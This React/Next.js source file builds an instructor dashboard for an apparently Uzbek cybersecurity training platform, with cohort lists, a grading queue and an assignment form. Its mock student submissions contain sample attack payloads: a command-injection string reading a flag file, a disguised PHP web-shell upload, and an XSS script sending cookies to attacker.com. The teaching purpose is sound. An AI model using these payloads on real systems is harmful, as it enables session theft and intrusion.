'use client';

import { useState } from 'react';
import Link from 'next/link';
import { 
  GraduationCap, Users, BookOpen, CheckCircle, Clock, 
  FileText, Award, AlertCircle, Plus, Search, ChevronRight, 
  Send, Sparkles, Filter, Check, X 
} from 'lucide-react';
import { Button } from '@/components/ui/button';

interface Submission {
  id: string;
  studentName: string;
  studentUsername: string;
  labTitle: string;
  category: string;
  submittedAt: string;
  evidence: string;
  autoGradePassed: boolean;
  status: 'PENDING' | 'GRADED';
}

export default function InstructorWorkspacePage() {
  const [activeTab, setActiveTab] = useState<'cohorts' | 'grading' | 'new-assignment'>('cohorts');
  const [selectedCohort, setSelectedCohort] = useState('cohort-1');

  // Realistic cohorts data
  const cohorts = [
    { id: 'cohort-1', name: 'TATU — Kiberxavfsizlik 402-guruh', studentsCount: 28, activeAssignments: 3, avgProgress: 68 },
    { id: 'cohort-2', name: 'CyberAcademy — Web Pentest Bootcamp #14', studentsCount: 16, activeAssignments: 5, avgProgress: 84 },
    { id: 'cohort-3', name: 'TUIT — Tarmoq Xavfsizligi Guruhi', studentsCount: 22, activeAssignments: 2, avgProgress: 45 },
  ];

  // Pending grading submissions
  const [submissions, setSubmissions] = useState<Submission[]>([
    {
      id: 'sub-1',
      studentName: 'Sardorbek Qodirov',
      studentUsername: 'sardor_sec',
      labTitle: 'DiagnosticPanel — OS Command Injection',
      category: 'COMMAND_INJECTION',
      submittedAt: 'Bugun, 13:40',
      evidence: `Payload: 127.0.0.1; cat /secret/flag.txt\nChiqish natijasi: FLAG{command_injection_rce_achieved_9942}`,
      autoGradePassed: true,
      status: 'PENDING',
    },
    {
      id: 'sub-2',
      studentName: 'Nodira Alimova',
      studentUsername: 'nodira_pwn',
      labTitle: 'MediaVault — Unrestricted File Upload',
      category: 'FILE_UPLOAD',
      submittedAt: 'Bugun, 12:15',
      evidence: `Fayl nomi: shell.php.png\nBajarilgan buyruq: system('id');\nChiqish: uid=33(www-data) gid=33(www-data) groups=33(www-data)`,
      autoGradePassed: true,
      status: 'PENDING',
    },
    {
      id: 'sub-3',
      studentName: 'Jahongir Rustamov',
      studentUsername: 'jahon_exploit',
      labTitle: 'CyberForum — Stored XSS',
      category: 'XSS',
      submittedAt: 'Kecha, 18:30',
      evidence: `Payload: <script>document.location='http://attacker.com/steal?c='+document.cookie</script>\nAdmin sessiyasi tutildi.`,
      autoGradePassed: true,
      status: 'PENDING',
    },
  ]);

  const [gradeScore, setGradeScore] = useState<Record<string, number>>({});
  const [gradeFeedback, setGradeFeedback] = useState<Record<string, string>>({});

  const handleGrade = (id: string) => {
    setSubmissions((prev) =>
      prev.map((s) => (s.id === id ? { ...s, status: 'GRADED' } : s))
    );
  };

  return (
    <div className="min-h-screen bg-[#070A0E] text-gray-100 py-10 px-4 font-sans">
      <div className="max-w-7xl mx-auto space-y-8">
        
        {/* Banner */}
        <div className="bg-[#0B0F17] border border-gray-800 rounded-2xl p-6 md:p-8 shadow-2xl relative overflow-hidden">
          <div className="absolute top-0 right-0 w-80 h-80 bg-purple-500/10 rounded-full blur-3xl pointer-events-none" />

          <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-6 relative z-10">
            <div className="flex items-center space-x-5">
              <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-purple-500 to-indigo-600 p-0.5 shadow-xl flex-shrink-0">
                <div className="w-full h-full bg-[#0B0F17] rounded-[14px] flex items-center justify-center text-purple-400">
                  <GraduationCap className="w-8 h-8" />
                </div>
              </div>

              <div>
                <div className="flex items-center space-x-3">
                  <h1 className="text-2xl md:text-3xl font-black text-white">Ustoz & Mentor Paneli</h1>
                  <span className="bg-purple-500/10 border border-purple-500/30 text-purple-400 text-xs font-bold px-2.5 py-0.5 rounded-full">
                    INSTRUCTOR WORKSPACE
                  </span>
                </div>
                <p className="text-xs text-gray-400 mt-1">
                  Talabalar guruhlari, amaliy topshiriqlar berish va laboratoriya hisobotlarini baholash
                </p>
              </div>
            </div>

            <div className="flex items-center space-x-3">
              <button
                onClick={() => setActiveTab('new-assignment')}
                className="px-5 py-2.5 bg-gradient-to-r from-purple-500 to-indigo-500 hover:from-purple-400 hover:to-indigo-400 text-white font-bold text-xs rounded-xl shadow-lg shadow-purple-500/20 transition-all flex items-center space-x-2"
              >
                <Plus className="w-4 h-4" />
                <span>Yangi Topshiriq Yaratish</span>
              </button>
            </div>
          </div>

          {/* Quick Metrics */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mt-8 pt-6 border-t border-gray-800/80">
            <div>
              <span className="text-[11px] text-gray-500 uppercase tracking-wider block">Faol Guruhlar</span>
              <span className="text-xl font-bold text-purple-400">3 ta kohorta</span>
            </div>
            <div>
              <span className="text-[11px] text-gray-500 uppercase tracking-wider block">Jami Talabalar</span>
              <span className="text-xl font-bold text-white">66 nafar</span>
            </div>
            <div>
              <span className="text-[11px] text-gray-500 uppercase tracking-wider block">Tekshirish Kutilmoqda</span>
              <span className="text-xl font-bold text-amber-400">
                {submissions.filter((s) => s.status === 'PENDING').length} ta ish
              </span>
            </div>
            <div>
              <span className="text-[11px] text-gray-500 uppercase tracking-wider block">O'rtacha Baho</span>
              <span className="text-xl font-bold text-emerald-400">86.4 / 100</span>
            </div>
          </div>
        </div>

        {/* Tab Selector */}
        <div className="flex border-b border-gray-800">
          <button
            onClick={() => setActiveTab('cohorts')}
            className={`pb-3 px-4 text-xs font-bold border-b-2 flex items-center space-x-2 transition-colors ${
              activeTab === 'cohorts'
                ? 'border-purple-400 text-purple-400'
                : 'border-transparent text-gray-400 hover:text-gray-200'
            }`}
          >
            <Users className="w-4 h-4" />
            <span>Talabalar Guruhlari ({cohorts.length})</span>
          </button>
          <button
            onClick={() => setActiveTab('grading')}
            className={`pb-3 px-4 text-xs font-bold border-b-2 flex items-center space-x-2 transition-colors ${
              activeTab === 'grading'
                ? 'border-purple-400 text-purple-400'
                : 'border-transparent text-gray-400 hover:text-gray-200'
            }`}
          >
            <FileText className="w-4 h-4" />
            <span>Laboratoriya Ishlarini Baholash ({submissions.filter((s) => s.status === 'PENDING').length})</span>
          </button>
          <button
            onClick={() => setActiveTab('new-assignment')}
            className={`pb-3 px-4 text-xs font-bold border-b-2 flex items-center space-x-2 transition-colors ${
              activeTab === 'new-assignment'
                ? 'border-purple-400 text-purple-400'
                : 'border-transparent text-gray-400 hover:text-gray-200'
            }`}
          >
            <Plus className="w-4 h-4" />
            <span>Topshiriq Berish</span>
          </button>
        </div>

        {/* Tab 1: Cohorts */}
        {activeTab === 'cohorts' && (
          <div className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
              {cohorts.map((c) => (
                <div
                  key={c.id}
                  onClick={() => setSelectedCohort(c.id)}
                  className={`p-6 rounded-2xl border cursor-pointer transition-all ${
                    selectedCohort === c.id
                      ? 'bg-[#0E131E] border-purple-500 shadow-xl shadow-purple-500/10'
                      : 'bg-[#0B0F17] border-gray-800 hover:border-gray-700'
                  }`}
                >
                  <div className="flex items-center justify-between mb-3">
                    <span className="text-[10px] font-bold text-purple-400 bg-purple-500/10 border border-purple-500/20 px-2.5 py-0.5 rounded-full">
                      {c.studentsCount} nafar talaba
                    </span>
                    <span className="text-xs text-gray-400 font-semibold">{c.activeAssignments} ta vazifa</span>
                  </div>

                  <h3 className="text-base font-bold text-white mb-2">{c.name}</h3>

                  <div className="space-y-1.5 mt-4 pt-4 border-t border-gray-800/80">
                    <div className="flex justify-between text-xs">
                      <span className="text-gray-500">Guruh o'zlashtirishi:</span>
                      <span className="text-emerald-400 font-bold">{c.avgProgress}%</span>
                    </div>
                    <div className="w-full bg-gray-950 h-1.5 rounded-full overflow-hidden border border-gray-800">
                      <div className="bg-emerald-500 h-full rounded-full" style={{ width: `${c.avgProgress}%` }} />
                    </div>
                  </div>
                </div>
              ))}
            </div>

            {/* Selected Cohort Student Table */}
            <div className="bg-[#0B0F17] border border-gray-800 rounded-2xl overflow-hidden shadow-xl">
              <div className="p-4 bg-gray-900/60 border-b border-gray-800 flex items-center justify-between">
                <div>
                  <h3 className="text-sm font-bold text-white">Guruh Talabalari Jurnali</h3>
                  <p className="text-[11px] text-gray-400">Har bir talabaning individual reytingi va topshirilgan laboratoriyalari</p>
                </div>
                <button className="px-3 py-1.5 bg-gray-800 hover:bg-gray-700 text-xs font-semibold text-gray-200 rounded-lg transition-colors">
                  Eksport (CSV)
                </button>
              </div>

              <div className="divide-y divide-gray-800/80 text-xs">
                {[
                  { name: 'Sardorbek Qodirov', username: 'sardor_sec', xp: 3200, labs: 12, lastActive: '10 daqiqa oldin', grade: '92 / A' },
                  { name: 'Nodira Alimova', username: 'nodira_pwn', xp: 2850, labs: 10, lastActive: '1 soat oldin', grade: '88 / B+' },
                  { name: 'Jahongir Rustamov', username: 'jahon_exploit', xp: 2400, labs: 8, lastActive: 'Kecha', grade: '80 / B' },
                  { name: 'Olimjon Mahmudov', username: 'olim_cyber', xp: 1900, labs: 6, lastActive: '2 kun oldin', grade: '74 / C+' },
                ].map((s, idx) => (
                  <div key={idx} className="p-4 flex items-center justify-between hover:bg-gray-900/30 transition-colors">
                    <div className="flex items-center space-x-3">
                      <span className="text-gray-500 font-mono w-4">{idx + 1}</span>
                      <div className="w-8 h-8 rounded-lg bg-purple-500/10 border border-purple-500/20 text-purple-400 font-bold flex items-center justify-center">
                        {s.name.charAt(0)}
                      </div>
                      <div>
                        <span className="font-bold text-white block">{s.name}</span>
                        <span className="text-[10px] text-gray-500">@{s.username} • Oxirgi faollik: {s.lastActive}</span>
                      </div>
                    </div>

                    <div className="flex items-center space-x-8">
                      <div className="text-right">
                        <span className="font-bold text-purple-400">{s.xp.toLocaleString()} XP</span>
                        <span className="text-[10px] text-gray-500 block">{s.labs} ta laboratoriya</span>
                      </div>

                      <span className="px-2.5 py-1 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 font-mono font-bold rounded-lg text-xs">
                        {s.grade}
                      </span>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* Tab 2: Grading Queue */}
        {activeTab === 'grading' && (
          <div className="space-y-4">
            {submissions.filter((s) => s.status === 'PENDING').length === 0 ? (
              <div className="bg-[#0B0F17] border border-gray-800 rounded-2xl p-12 text-center text-gray-400">
                <CheckCircle className="w-12 h-12 text-emerald-400 mx-auto mb-3" />
                <h3 className="text-base font-bold text-white">Barcha ishlar tekshirib chiqilgan!</h3>
                <p className="text-xs text-gray-500 mt-1">Hozirda yangi baholash navbatida topshiriqlar mavjud emas.</p>
              </div>
            ) : (
              submissions
                .filter((s) => s.status === 'PENDING')
                .map((sub) => (
                  <div key={sub.id} className="bg-[#0B0F17] border border-gray-800 rounded-2xl p-6 space-y-4 shadow-xl">
                    <div className="flex items-center justify-between pb-3 border-b border-gray-800">
                      <div>
                        <div className="flex items-center space-x-2">
                          <h4 className="text-sm font-bold text-white">{sub.studentName}</h4>
                          <span className="text-[11px] font-mono text-gray-400">(@{sub.studentUsername})</span>
                          <span className="text-[10px] bg-purple-500/10 text-purple-400 border border-purple-500/20 px-2 py-0.2 rounded">
                            {sub.category}
                          </span>
                        </div>
                        <span className="text-xs text-cyan-400 mt-0.5 block">{sub.labTitle}</span>
                      </div>

                      <span className="text-[11px] text-gray-500">{sub.submittedAt}</span>
                    </div>

                    <div>
                      <span className="text-[10px] font-bold text-gray-500 uppercase tracking-wider block mb-1.5">
                        Talaba Tomonidan Taqdim Etilgan Dalil & Eksploit:
                      </span>
                      <pre className="bg-gray-950 border border-gray-800 rounded-xl p-3 text-xs font-mono text-cyan-300 whitespace-pre-wrap">
                        {sub.evidence}
                      </pre>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-12 gap-3 pt-2">
                      <div className="md:col-span-3">
                        <label className="block text-[10px] font-bold text-gray-400 uppercase mb-1">
                          Baho (0 - 100)
                        </label>
                        <input
                          type="number"
                          min="0"
                          max="100"
                          defaultValue={95}
                          className="w-full bg-gray-950 border border-gray-800 rounded-xl px-3 py-2 text-xs font-bold text-white focus:outline-none focus:border-purple-500"
                        />
                      </div>

                      <div className="md:col-span-6">
                        <label className="block text-[10px] font-bold text-gray-400 uppercase mb-1">
                          Ustoz Sharhi (Feedback)
                        </label>
                        <input
                          type="text"
                          placeholder="Yaxshi tahlil qilingan, buyruq ajratgich to'g'ri tanlangan..."
                          className="w-full bg-gray-950 border border-gray-800 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-purple-500"
                        />
                      </div>

                      <div className="md:col-span-3 flex items-end">
                        <button
                          onClick={() => handleGrade(sub.id)}
                          className="w-full py-2 bg-gradient-to-r from-purple-500 to-indigo-500 hover:from-purple-400 hover:to-indigo-400 text-white font-bold text-xs rounded-xl shadow-lg shadow-purple-500/20 transition-all flex items-center justify-center space-x-1.5"
                        >
                          <Check className="w-3.5 h-3.5" />
                          <span>Baholash va Tasdiqlash</span>
                        </button>
                      </div>
                    </div>
                  </div>
                ))
            )}
          </div>
        )}

        {/* Tab 3: New Assignment */}
        {activeTab === 'new-assignment' && (
          <div className="bg-[#0B0F17] border border-gray-800 rounded-2xl p-8 max-w-2xl mx-auto shadow-2xl space-y-6">
            <h3 className="text-lg font-bold text-white flex items-center">
              <Plus className="w-5 h-5 text-purple-400 mr-2" /> Yangi Kiber-Topshiriq Berish
            </h3>

            <div className="space-y-4 text-xs">
              <div>
                <label className="block text-[11px] font-bold text-gray-400 uppercase tracking-wider mb-1.5">
                  Kohorta / Guruhni Tanlang
                </label>
                <select className="w-full bg-gray-950 border border-gray-800 rounded-xl px-4 py-2.5 text-white focus:outline-none focus:border-purple-500">
                  {cohorts.map((c) => (
                    <option key={c.id} value={c.id}>{c.name}</option>
                  ))}
                </select>
              </div>

              <div>
                <label className="block text-[11px] font-bold text-gray-400 uppercase tracking-wider mb-1.5">
                  Topshiriq Turi
                </label>
                <div className="grid grid-cols-2 gap-3">
                  <div className="p-3 bg-purple-500/10 border border-purple-500/40 rounded-xl text-purple-300 font-semibold cursor-pointer">
                    Laboratoriya Bajarish (Lab Session)
                  </div>
                  <div className="p-3 bg-gray-900 border border-gray-800 rounded-xl text-gray-400 cursor-pointer hover:border-gray-700">
                    CTF Flag Topish (CTF Challenge)
                  </div>
                </div>
              </div>

              <div>
                <label className="block text-[11px] font-bold text-gray-400 uppercase tracking-wider mb-1.5">
                  Laboratoriyani Tanlang (50+ ta amaliy lab)
                </label>
                <select className="w-full bg-gray-950 border border-gray-800 rounded-xl px-4 py-2.5 text-white focus:outline-none focus:border-purple-500">
                  <option value="sql-injection-basic">CyberBooks — SQL Injection (SQLi)</option>
                  <option value="xss-cyberforum">CyberForum — Cross-Site Scripting (XSS)</option>
                  <option value="diagnostic-panel-command">DiagnosticPanel — OS Command Injection</option>
                  <option value="securedocs-idor">SecureDocs — IDOR / BOLA Zaifligi</option>
                  <option value="mediavault-upload">MediaVault — Unrestricted File Upload</option>
                </select>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-[11px] font-bold text-gray-400 uppercase tracking-wider mb-1.5">
                    Muddati (Deadline)
                  </label>
                  <input
                    type="date"
                    className="w-full bg-gray-950 border border-gray-800 rounded-xl px-4 py-2 text-white focus:outline-none focus:border-purple-500"
                  />
                </div>
                <div>
                  <label className="block text-[11px] font-bold text-gray-400 uppercase tracking-wider mb-1.5">
                    Maksimal Ball
                  </label>
                  <input
                    type="number"
                    defaultValue={100}
                    className="w-full bg-gray-950 border border-gray-800 rounded-xl px-4 py-2 text-white focus:outline-none focus:border-purple-500"
                  />
                </div>
              </div>

              <div className="pt-4 border-t border-gray-800 flex justify-end space-x-3">
                <button
                  type="button"
                  onClick={() => setActiveTab('cohorts')}
                  className="px-4 py-2 bg-gray-900 hover:bg-gray-800 text-gray-300 font-semibold rounded-xl"
                >
                  Bekor qilish
                </button>
                <button
                  type="button"
                  onClick={() => setActiveTab('cohorts')}
                  className="px-5 py-2 bg-purple-500 hover:bg-purple-400 text-white font-bold rounded-xl shadow-lg shadow-purple-500/20"
                >
                  Topshiriqni E'lon Qilish
                </button>
              </div>
            </div>
          </div>
        )}

      </div>
    </div>
  );
}
